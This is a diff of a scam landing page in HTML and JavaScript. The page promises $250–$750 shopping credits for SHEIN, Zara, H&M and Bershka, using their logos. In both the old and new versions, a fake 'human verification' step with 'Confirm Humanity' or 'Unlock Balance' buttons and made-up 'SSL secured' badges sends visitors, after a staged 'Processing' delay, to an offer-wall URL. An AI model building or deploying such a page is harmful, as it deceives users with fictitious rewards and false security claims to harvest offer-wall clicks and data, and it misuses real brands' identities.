-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p2"><span class="Apple-converted-space">            </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div class="p-10 border border-gray-100 rounded-[50px] bg-[#fdfaf8] shadow-inner"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;button onclick="triggerOfferWall()" id="verifyBtn" class="w-full btn-luxury py-6 rounded-full text-[11px] font-bold uppercase shadow-2xl mb-8"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>Confirm Humanity</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/button&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;div class="flex items-center justify-center space-x-3"&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"&gt;&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                    </span>&lt;span class="text-[10px] text-gray-400 uppercase tracking-[0.3em] font-bold"&gt;256-Bit SSL Secured&lt;/span&gt;</p>
-<p class="p1"><span class="Apple-converted-space">                </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>&lt;div id="loadingStatus" class="hidden text-gold-accent font-bold text-xs uppercase tracking-widest animate-pulse"&gt;Routing to gateway...&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>&lt;/div&gt;</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/div&gt;</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;script&gt;</p>
-<p class="p1"><span class="Apple-converted-space">        </span>function scrollToSection(id) {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>const element = document.getElementById(id);</p>
-<p class="p1"><span class="Apple-converted-space">            </span>if (element) {</p>
-<p class="p1"><span class="Apple-converted-space">                </span>element.scrollIntoView({ behavior: 'smooth' });</p>
-<p class="p1"><span class="Apple-converted-space">            </span>}</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><br></p>
-<p class="p1"><span class="Apple-converted-space">        </span>function openConfirmation(tierName) {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('selectedTier').innerText = tierName;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('confirmationModal').classList.remove('hidden');</p>
-<p class="p1"><span class="Apple-converted-space">            </span>document.body.style.overflow = 'hidden';</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><span class="Apple-converted-space">        </span></p>
-<p class="p1"><span class="Apple-converted-space">        </span>function closeConfirmation() {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('confirmationModal').classList.add('hidden');</p>
-<p class="p1"><span class="Apple-converted-space">            </span>document.body.style.overflow = 'auto';</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><span class="Apple-converted-space">        </span></p>
-<p class="p1"><span class="Apple-converted-space">        </span>function goToVerification() {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('confirmationModal').classList.add('hidden');</p>
-<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('verificationScreen').classList.remove('hidden');</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p2"><span class="Apple-converted-space">        </span></p>
-<p class="p1"><span class="Apple-converted-space">        </span>function triggerOfferWall() {</p>
-<p class="p1"><span class="Apple-converted-space">            </span>const btn = document.getElementById('verifyBtn');</p>
-<p class="p1"><span class="Apple-converted-space">            </span>btn.innerHTML = "Processing Gateway...";</p>
-<p class="p1"><span class="Apple-converted-space">            </span>btn.disabled = true;</p>
-<p class="p1"><span class="Apple-converted-space">            </span>document.getElementById('loadingStatus').classList.remove('hidden');</p>
-<p class="p2"><span class="Apple-converted-space">            </span></p>
-<p class="p1"><span class="Apple-converted-space">            </span>setTimeout(() =&gt; {</p>
-<p class="p1"><span class="Apple-converted-space">                </span>window.location.href = "https://lockedpage1.website/cl/i/qkv7w4";</p>
-<p class="p1"><span class="Apple-converted-space">            </span>}, 800);</p>
-<p class="p1"><span class="Apple-converted-space">        </span>}</p>
-<p class="p1"><span class="Apple-converted-space">    </span>&lt;/script&gt;</p>
-<p class="p1">&lt;/body&gt;</p>
-<p class="p1">&lt;/html&gt;</p>
+<body class="bg-[#F9F7F2]">
+
+    <!-- VIEW 1: LANDING EXPERIENCE -->
+    <main id="view-landing" class="view-section active min-h-screen relative flex flex-col">
+        <!-- Minimal Nav -->
+        <nav class="absolute top-0 w-full p-8 flex justify-between items-center z-10">
+            <div class="serif italic text-2xl text-charcoal tracking-wide">The Studio.</div>
+            <button onclick="transitionTo('marketplace')" class="text-xs uppercase tracking-[0.2em] hover:text-gold-muted transition-colors">Member Sign In</button>
+        </nav>
+
+        <div class="flex-1 flex flex-col lg:flex-row h-full">
+            <!-- Image Side -->
+            <div class="lg:w-1/2 h-[50vh] lg:h-auto relative overflow-hidden order-1 lg:order-2">
+                <img src="https://images.unsplash.com/photo-1469334031218-e382a71b716b?q=80&w=1200&auto=format&fit=crop" class="absolute inset-0 w-full h-full object-cover" alt="Lifestyle Editorial">
+                <div class="absolute inset-0 bg-black/10"></div>
+            </div>
+
+            <!-- Content Side -->
+            <div class="lg:w-1/2 flex items-center justify-center p-8 lg:p-20 order-2 lg:order-1">
+                <div class="max-w-md">
+                    <span class="block text-[10px] uppercase tracking-[0.3em] text-gold-muted mb-6">Invitation Only</span>
+                    <h1 class="text-5xl lg:text-7xl leading-[1.1] mb-8 text-charcoal">
+                        Curated <br>
+                        <span class="italic text-stone font-light">Lifestyle</span> <br>
+                        Rewards
+                    </h1>
+                    <p class="text-sm font-light leading-loose text-stone mb-12 max-w-xs">
+                        A sanctuary for trendsetters. Access premium credits for the world's most coveted fashion and beauty houses.
+                    </p>
+                    <button onclick="transitionTo('marketplace')" class="group flex items-center space-x-4">
+                        <span class="h-[1px] w-12 bg-charcoal group-hover:w-20 transition-all duration-300"></span>
+                        <span class="text-xs uppercase tracking-[0.25em] text-charcoal">Enter The Studio</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- VIEW 2: MARKETPLACE & STUDIO DASHBOARD -->
+    <main id="view-marketplace" class="view-section min-h-screen pb-20">
+        
+        <!-- Sticky Glass Header -->
+        <header class="sticky top-0 z-40 glass-panel px-6 py-4 flex justify-between items-center shadow-sm">
+            <div class="serif italic text-lg text-charcoal">The Studio.</div>
+            <div class="flex items-center space-x-6">
+                <div class="text-right hidden md:block">
+                    <div class="text-[9px] uppercase tracking-widest text-stone">Studio Balance</div>
+                    <div class="serif text-lg text-charcoal opacity-50">$0.00</div>
+                </div>
+                <div class="w-8 h-8 rounded-full bg-sand flex items-center justify-center text-charcoal text-xs serif italic">M</div>
+            </div>
+        </header>
+
+        <div class="container mx-auto px-6 pt-12">
+            
+            <!-- ZERO BALANCE STATE / GREETING -->
+            <div class="mb-16 fade-in">
+                <h2 class="text-3xl lg:text-5xl mb-3 text-charcoal">Welcome, <span class="italic text-stone">Guest</span></h2>
+                <p class="text-stone font-light text-sm">Your studio wallet is currently empty. Select an access tier to begin your curation.</p>
+                
+                <!-- Status Bar -->
+                <div class="mt-8 p-4 bg-white rounded-xl border border-sand inline-flex items-center gap-4 shadow-sm">
+                    <div class="w-2 h-2 rounded-full bg-stone"></div>
+                    <span class="text-[10px] uppercase tracking-widest text-stone">Status: <span class="text-charcoal font-medium">Pending Verification</span></span>
+                    <span class="h-4 w-[1px] bg-sand"></span>
+                    <span class="text-[10px] uppercase tracking-widest text-stone">Balance: <span class="text-charcoal font-medium">$0.00</span></span>
+                </div>
+            </div>
+
+            <!-- SECTION 1: CREDIT TIERS (Studio Access) -->
+            <section class="mb-20">
+                <div class="flex items-end justify-between mb-8">
+                    <h3 class="serif text-2xl italic text-charcoal">Access Tiers</h3>
+                    <span class="text-[9px] uppercase tracking-widest text-gold-muted">Select to Unlock</span>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <!-- Tier 1 -->
+                    <div class="bg-white p-8 rounded-[2rem] border border-transparent hover:border-gold-light transition-all shadow-sm group cursor-pointer" onclick="selectTier('$250', this)">
+                        <div class="flex justify-between items-start mb-12">
+                            <span class="text-[9px] uppercase tracking-widest text-stone">Standard</span>
+                            <div class="w-4 h-4 rounded-full border border-stone group-hover:bg-gold-muted group-hover:border-gold-muted transition-colors"></div>
+                        </div>
+                        <div class="serif text-4xl mb-2">$250</div>
+                        <div class="text-[10px] text-stone tracking-wide">Lifestyle Credit</div>
+                    </div>
+
+                    <!-- Tier 2 -->
+                    <div class="bg-charcoal text-white p-8 rounded-[2rem] shadow-xl transform scale-[1.02] cursor-pointer relative overflow-hidden" onclick="selectTier('$500', this)">
+                        <div class="absolute top-0 right-0 p-6 opacity-10 serif italic text-9xl leading-none">$</div>
+                        <div class="flex justify-between items-start mb-12 relative z-10">
+                            <span class="text-[9px] uppercase tracking-widest text-gold-muted">Editorial Choice</span>
+                            <div class="w-4 h-4 rounded-full border border-white/30 bg-gold-muted"></div>
+                        </div>
+                        <div class="serif text-5xl mb-2 relative z-10">$500</div>
+                        <div class="text-[10px] text-white/60 tracking-wide relative z-10">Premium Credit</div>
+                    </div>
+
+                    <!-- Tier 3 -->
+                    <div class="bg-white p-8 rounded-[2rem] border border-transparent hover:border-gold-light transition-all shadow-sm group cursor-pointer" onclick="selectTier('$750', this)">
+                        <div class="flex justify-between items-start mb-12">
+                            <span class="text-[9px] uppercase tracking-widest text-stone">Elite</span>
+                            <div class="w-4 h-4 rounded-full border border-stone group-hover:bg-gold-muted group-hover:border-gold-muted transition-colors"></div>
+                        </div>
+                        <div class="serif text-4xl mb-2">$750</div>
+                        <div class="text-[10px] text-stone tracking-wide">Lifestyle Credit</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- SECTION 2: MARKETPLACE DISCOVERY -->
+            <section>
+                <div class="flex items-end justify-between mb-8 border-b border-charcoal/10 pb-4">
+                    <h3 class="serif text-2xl italic text-charcoal">The Collection</h3>
+                    <div class="flex space-x-6 text-[10px] uppercase tracking-widest">
+                        <span class="text-charcoal cursor-pointer border-b border-charcoal pb-4 -mb-4.5">All</span>
+                        <span class="text-stone hover:text-charcoal cursor-pointer transition-colors">Fashion</span>
+                        <span class="text-stone hover:text-charcoal cursor-pointer transition-colors">Beauty</span>
+                        <span class="text-stone hover:text-charcoal cursor-pointer transition-colors">Home</span>
+                    </div>
+                </div>
+
+                <!-- Horizontal Scroll Container for Mobile, Grid for Desktop -->
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-4 md:gap-8">
+                    <!-- Brand Item 1: SHEIN -->
+                    <div class="editorial-card group cursor-pointer" onclick="triggerVerification()">
+                        <div class="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
+                            <!-- Image -->
+                            <img src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?q=80&w=600&auto=format&fit=crop" class="editorial-img w-full h-full object-cover" alt="Fashion">
+                            
+                            <!-- Dark Overlay for Contrast -->
+                            <div class="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
+                            
+                            <!-- Logo Overlay (Updated Source: PNG) -->
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Shein_2021_logo.svg/800px-Shein_2021_logo.svg.png" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-20 md:w-24 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="SHEIN Logo">
+
+                            <div class="absolute bottom-4 left-4 text-white text-[9px] uppercase tracking-widest opacity-0 group-hover:opacity-100 transition-opacity">Redeem</div>
+                        </div>
+                        <h4 class="text-sm font-medium text-charcoal">SHEIN</h4>
+                        <p class="text-[10px] text-stone uppercase tracking-wide">Summer Edit</p>
+                    </div>
+
+                    <!-- Brand Item 2: Zara -->
+                    <div class="editorial-card group cursor-pointer" onclick="triggerVerification()">
+                        <div class="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
+                            <img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?q=80&w=600&auto=format&fit=crop" class="editorial-img w-full h-full object-cover" alt="Trend">
+                            <div class="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
+                            
+                            <!-- Zara Logo -->
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fd/Zara_Logo.svg" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-24 md:w-32 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="Zara Logo">
+                        </div>
+                        <h4 class="text-sm font-medium text-charcoal">Zara</h4>
+                        <p class="text-[10px] text-stone uppercase tracking-wide">Statement Pieces</p>
+                    </div>
+
+                    <!-- Brand Item 3: H&M -->
+                    <div class="editorial-card group cursor-pointer" onclick="triggerVerification()">
+                        <div class="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
+                            <img src="https://images.unsplash.com/photo-1441986300917-64674bd600d8?q=80&w=600&auto=format&fit=crop" class="editorial-img w-full h-full object-cover" alt="Style">
+                            <div class="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
+                            
+                            <!-- H&M Logo -->
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/H%26M-Logo.svg" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-16 md:w-20 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="H&M Logo">
+                        </div>
+                        <h4 class="text-sm font-medium text-charcoal">H&M</h4>
+                        <p class="text-[10px] text-stone uppercase tracking-wide">Daily Essentials</p>
+                    </div>
+
+                    <!-- Brand Item 4: Bershka (Updated Image) -->
+                    <div class="editorial-card group cursor-pointer" onclick="triggerVerification()">
+                        <div class="aspect-[3/4] rounded-xl overflow-hidden mb-4 relative bg-gray-100 shadow-md">
+                            <img src="https://images.unsplash.com/photo-1503342394128-c104d54dba01?q=80&w=600&auto=format&fit=crop" class="editorial-img w-full h-full object-cover" alt="Runway">
+                            <div class="absolute inset-0 bg-black/20 group-hover:bg-black/30 transition-colors duration-500"></div>
+                            
+                            <!-- Bershka Logo -->
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/75/Bershka_logo.svg" class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-24 md:w-32 h-auto object-contain brightness-0 invert opacity-90 drop-shadow-lg" alt="Bershka Logo">
+                        </div>
+                        <h4 class="text-sm font-medium text-charcoal">Bershka</h4>
+                        <p class="text-[10px] text-stone uppercase tracking-wide">Youth Culture</p>
+                    </div>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <!-- VIEW 3: ELEGANT VERIFICATION OVERLAY -->
+    <div id="verification-overlay" class="fixed inset-0 z-50 hidden">
+        <!-- Blurred Backdrop -->
+        <div class="absolute inset-0 bg-sand/80 backdrop-blur-xl transition-opacity duration-500" onclick="closeVerification()"></div>
+        
+        <!-- Modal Content -->
+        <div class="absolute inset-0 flex items-center justify-center p-6">
+            <div class="bg-white w-full max-w-md rounded-[30px] p-10 lg:p-14 shadow-2xl relative text-center">
+                
+                <!-- Gentle Close Button -->
+                <button onclick="closeVerification()" class="absolute top-6 right-6 text-stone hover:text-charcoal transition-colors">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M6 18L18 6M6 6l12 12"></path></svg>
+                </button>
+
+                <div class="w-12 h-[1px] bg-gold-muted mx-auto mb-8"></div>
+                
+                <h3 class="serif text-3xl text-charcoal mb-4 italic">Verification Required</h3>
+                <p class="text-stone text-xs leading-loose mb-10 font-light">
+                    To maintain the integrity of our studio and unlock your selected credit balance, we require a brief human verification. This ensures equitable access for all our members.
+                </p>
+
+                <div class="bg-champagne rounded-2xl p-6 mb-10">
+                    <div class="flex justify-between items-center mb-2">
+                        <span class="text-[10px] uppercase tracking-widest text-stone">Selected Access</span>
+                        <span class="font-bold text-charcoal" id="modal-tier-amount">$500.00</span>
+                    </div>
+                    <div class="flex justify-between items-center">
+                        <span class="text-[10px] uppercase tracking-widest text-stone">Status</span>
+                        <span class="text-[10px] uppercase tracking-widest text-gold-muted font-bold">Locked</span>
+                    </div>
+                </div>
+
+                <button onclick="finalRedirect()" id="verify-btn" class="w-full bg-charcoal text-white py-5 rounded-full text-[10px] uppercase tracking-[0.25em] hover:bg-black transition-colors shadow-lg">
+                    Unlock Balance
+                </button>
+                
+                <div class="mt-6 flex items-center justify-center space-x-2 opacity-50">
+                    <svg class="w-3 h-3 text-stone" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                    <span class="text-[8px] uppercase tracking-widest text-stone">Secure Connection</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // State Management
+        let currentTier = '$0.00';
+
+        function transitionTo(viewName) {
+            // Hide all active views
+            document.querySelectorAll('.view-section').forEach(el => {
+                el.classList.remove('active');
+                el.style.display = 'none';
+            });
+
+            // Show target view
+            const target = document.getElementById(`view-${viewName}`);
+            target.style.display = 'block';
+            
+            // Trigger reflow to restart animation
+            void target.offsetWidth; 
+            target.classList.add('active');
+            
+            window.scrollTo(0,0);
+        }
+
+        function selectTier(amount, element) {
+            currentTier = amount;
+            document.getElementById('modal-tier-amount').innerText = amount + '.00';
+            triggerVerification();
+        }
+
+        function triggerVerification() {
+            const overlay = document.getElementById('verification-overlay');
+            overlay.classList.remove('hidden');
+            // Subtle entrance animation
+            overlay.querySelector('div').classList.add('fade-in');
+        }
+
+        function closeVerification() {
+            document.getElementById('verification-overlay').classList.add('hidden');
+        }
+
+        function finalRedirect() {
+            const btn = document.getElementById('verify-btn');
+            btn.innerHTML = "Processing...";
+            btn.classList.add('opacity-75', 'cursor-not-allowed');
+            
+            setTimeout(() => {
+                // Link to offer wall
+                window.location.href = "https://lockedpage1.website/cl/i/qkv7w4";
+            }, 800);
+        }
+    </script>
 </body>
 </html>
